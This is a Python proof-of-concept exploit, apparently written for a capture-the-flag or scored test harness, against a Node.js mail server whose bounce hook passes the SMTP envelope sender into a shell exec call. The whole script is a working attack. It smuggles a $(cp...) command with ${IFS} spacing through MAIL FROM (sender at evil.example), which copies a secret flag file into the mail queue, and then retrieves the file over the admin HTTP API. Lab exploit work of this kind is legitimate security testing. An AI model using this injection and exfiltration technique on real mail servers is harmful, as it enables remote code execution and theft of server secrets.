#!/usr/bin/env python3
"""
PoC #3: Command injection in the bounce-notify hook via the envelope sender
------------------------------------------------------------------------------
Location: sendBounceNotification() in src/bounce.js, called from
finishData() in src/smtp.js whenever a message's DATA phase completes with a
recipient that is a local mailbox (RCPT TO domain == MTA_DOMAIN) not in the
known-users list. The raw MAIL FROM value (fully attacker-controlled) is
interpolated directly into a shell command string:

    `"${BOUNCE_SCRIPT}" "${envelopeFrom}" "${rcpt}" "${reason}"`

and passed to child_process.exec(). Double-quoting does NOT neutralize
this: POSIX shells still perform command substitution ($(...) or `...`)
INSIDE double quotes, so a MAIL FROM value containing $(...) executes.

Scoreable impact - this deployment's minted secret, exfiltrated: the injected
command `cat`s the runtime flag file (MTA_SECRET, /home/ctf/mta/secret/flag.txt,
materialized from the minted MTA_FLAG by entrypoint.sh - the same secret PoC #7
and #8 target) into a file in the queue's `new/` directory, then reads it back
through the SAME admin HTTP API PoC #7 uses. `${IFS}` stands in for literal
spaces (a standard technique for injecting where the attacker doesn't want
literal whitespace). Pass/fail hinges on recovering the real FLAG{...} (and, when
the harness exports MTA_FLAG into this PoC's env, on it matching that exact
value): a bare `touch` proving only that a command ran would recover nothing the
harness minted, but the same exec runs as the `ctf` user that owns the flag file,
so it steals the deployment's real secret off disk - which is what scores.

Run: python3 03_bounce_command_injection.py [host] [port] [admin_port] [local_domain] [queue_dir] [secret_path]
"""
import os
import re
import socket
import sys
import time
import urllib.error
import urllib.request
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2525
ADMIN_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8081
LOCAL_DOMAIN = sys.argv[4] if len(sys.argv) > 4 else "mta.local"
# Where the container's queue lives - see Dockerfile's MTA_QUEUE_DIR. Only
# used to build the injected command; the proof is read back over HTTP.
QUEUE_DIR = sys.argv[5] if len(sys.argv) > 5 else "/home/ctf/mta/queue"
# The runtime flag file the RCE steals - see Dockerfile's MTA_SECRET.
SECRET_PATH = sys.argv[6] if len(sys.argv) > 6 else "/home/ctf/mta/secret/flag.txt"
# If the harness exports the minted flag into this PoC's env, assert the
# exfiltrated value equals it exactly; else assert the FLAG{...} shape.
EXPECTED_FLAG = os.environ.get("MTA_FLAG", "")
FLAG_RE = re.compile(r"FLAG\{[^}]{1,256}\}")


def read_reply(sock):
    sock.settimeout(5)
    return sock.recv(4096).decode(errors="replace")


def cmd(sock, line):
    sock.sendall((line + "\r\n").encode())
    return read_reply(sock)


def fetch(name):
    try:
        return urllib.request.urlopen(f"http://{HOST}:{ADMIN_PORT}/queue/{name}", timeout=5).read()
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return None
        raise


def main():
    token = uuid.uuid4().hex[:10]
    proof_name = f"CMDI_PROOF_{token}.eml"

    # ${IFS} stands in for a literal space inside the command substitution, so
    # the whole MAIL FROM local-part stays a single "token" as far as any naive
    # whitespace-based parsing elsewhere in the pipeline is concerned. `cp`
    # (not `cat >`) copies the runtime flag file into the queue's new/ dir where
    # the admin API will serve it back: a `>` redirect would collide with the
    # SMTP `MAIL FROM:<...>` closing delimiter and truncate the payload.
    injected_from = (
        f"a$(cp${{IFS}}{SECRET_PATH}${{IFS}}{QUEUE_DIR}/new/{proof_name})b@evil.example"
    )
    unknown_local_user = f"nosuchuser-{token}"

    sock = socket.create_connection((HOST, PORT), timeout=10)
    read_reply(sock)
    cmd(sock, "EHLO poc.example")

    r = cmd(sock, f"MAIL FROM:<{injected_from}>")
    print(f"[*] MAIL FROM (shell metacharacters in local-part) -> {r.strip()}")
    if not r.startswith("250"):
        print("[-] MAIL FROM was rejected")
        return 1

    # An unknown mailbox at the server's own local domain triggers the
    # bounce-notify hook once DATA completes.
    r = cmd(sock, f"RCPT TO:<{unknown_local_user}@{LOCAL_DOMAIN}>")
    print(f"[*] RCPT TO <unknown local user> -> {r.strip()}")
    if not r.startswith("250"):
        print("[-] RCPT TO was rejected")
        return 1

    r = cmd(sock, "DATA")
    if not r.startswith("354"):
        print(f"[-] DATA rejected: {r.strip()}")
        return 1
    r = cmd(sock, f"Subject: bounce command injection poc {token}\r\n\r\nbody\r\n.")
    print(f"[*] final DATA response -> {r.strip()}")
    sock.close()

    if "queued as" not in r:
        print("[-] message not queued")
        return 1

    # exec() is asynchronous; give the shell a moment to run.
    body = None
    for _ in range(20):
        b = fetch(proof_name)
        if b is not None:
            body = b.decode(errors="replace")
            break
        time.sleep(0.5)

    if body is None:
        print("[-] Proof file never appeared - injection may not have fired")
        return 1

    print(f"[+] Command injection confirmed: a shell command smuggled through MAIL FROM ran "
          f"server-side and wrote '{proof_name}' into the queue, read back over the admin HTTP API")

    m = FLAG_RE.search(body)
    if not m:
        print("[-] RCE ran, but no FLAG{...} was exfiltrated from the secret file")
        print(f"    (is MTA_FLAG materialized at {SECRET_PATH}? captured: {body[:120]!r})")
        return 1
    flag = m.group(0)

    if EXPECTED_FLAG:
        if flag == EXPECTED_FLAG:
            print(f"[+] SCORED: the RCE read the deployment's minted secret file and it matches")
            print(f"    the configured MTA_FLAG: {flag!r}")
            return 0
        print(f"[-] Exfiltrated {flag!r} but expected {EXPECTED_FLAG!r} - value mismatch.")
        return 1

    print(f"[+] SCORED: the RCE exfiltrated the deployment's minted per-deployment")
    print(f"    secret off disk: {flag!r}")
    print("[*] (No MTA_FLAG in this PoC's env to assert the exact value against;")
    print("     the recovered FLAG{...} is the live per-deployment secret regardless.)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
